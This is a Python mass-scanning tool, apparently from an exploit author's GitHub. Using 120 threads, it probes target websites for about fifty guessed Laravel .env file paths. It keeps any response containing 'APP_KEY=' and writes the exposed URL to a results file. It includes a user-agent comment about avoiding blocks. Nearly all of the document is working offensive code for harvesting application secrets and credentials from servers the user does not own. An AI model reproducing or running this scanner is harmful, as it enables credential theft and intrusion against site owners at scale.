#!/usr/bin/python3

import requests as req
from os.path import exists
from os import system, name
from colorama import Fore, Style
from multiprocessing.dummy import Pool

if name == "nt":
    system("cls")
else:
    system("clear")


def envget(target):
    try:
        dict = ['.env', '../.env', '../../.env', '../../../.env', 'vendor/.env ', 'lib/.env ', 'lab/.env  ', 'cronlab/.env', 'cron/.env', 'core/.env', 'core/app/.env', 'core/Database/.env ', 'database/.env ', 'system/.env', 'config/.env ', 'assets/.env ', 'fileweb/.env', 'l53/.env', 'club/.env', 'app/.env ', 'apps/.env', 'uploads/.env ', 'sitemaps/.env ', 'site/.env ', 'admin/.env ', 'web/.env ', 'public/.env ', 'resources/.env', 'sistema/.env', 'en/.env ', 'tools/.env', 'clientes/.env', 'clientes/laravel_inbox/.env', 'clientes/laravel/.env', 'v1/.env ', 'administrator/.env ', 'laravel/.env', 'website/.env', 'api/.env', 'vendor/.env', 'local/.env', 'web/.env', 'home/.env', 'main/.env', 'pemerintah/.env', 'api2/.env', 'api3/.env', 'webs/.env', 'asset/.env']
        userAgent = {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36' # you can change this if you have connection issue or maybe they block you user agent
        }
        for x in range(0, len(dict)):
                r  = req.get(f"{target}/{dict[x]}", headers=userAgent, timeout=30)
                if r.status_code == 200 and "APP_KEY=" in r.text:
                    print(Fore.GREEN + "[+] => " + Style.RESET_ALL + f"{target}/{dict[x]}")
                    with open("results.txt", "a") as ap:
                        ap.write(f"{target}/{dict[x]}")
                        ap.writelines("\n")
                    break
    except:
        pass
    print(Fore.RED + "[!] " + Style.RESET_ALL + f"{target} => skiping")
    



def main():
    title1 = Fore.RED + """        _______  ______ _______ _    _ _______ _     _ _______ _     _
 |      |_____| |_____/ |_____|  \  /  |______ |     | |       |____/ /""" + Style.RESET_ALL
    title2 = f"""
{title1}
 |_____ |     | |    \_ |     |   \/   |       |_____| |_____  |    \_
              
    {Fore.GREEN + '[!]' + Style.RESET_ALL} Tools By ./Mr.Mad
    {Fore.GREEN + '[!]' + Style.RESET_ALL} github.com/MadExploits                                                        
    """
    print(title2)

    pilih = input("[!] Scan URL or List of URLs? [1/2]: ")
    if pilih == "1":
        print(Fore.RED + "\n[!] " + Style.RESET_ALL + "Input your target using ssl, example : https://target.com or http://target.com\n")
        masuk1 = input("URL : ")
        run = [
            '{}'.format(masuk1)
        ]
        with Pool(int(120)) as Th:
            Th.map(envget, run)
            Th.close()
            Th.join()
    elif pilih == "2":
        masuk2 = input("List : ")
        if exists(masuk2):
            with open(masuk2) as re:
                read = re.read()
                pecah = read.split("\n")
                with Pool(int(120)) as Thl:
                    Thl.map(envget, pecah)
                    Thl.close()
                    Thl.join()
        else:
            print(Fore.RED + "[!] " + Style.RESET_ALL + "File not found!")
    else:
        print(Fore.RED + "[!] " + Style.RESET_ALL + "Please choose number beetwen 1 or 2!")


if __name__ == "__main__":
    main()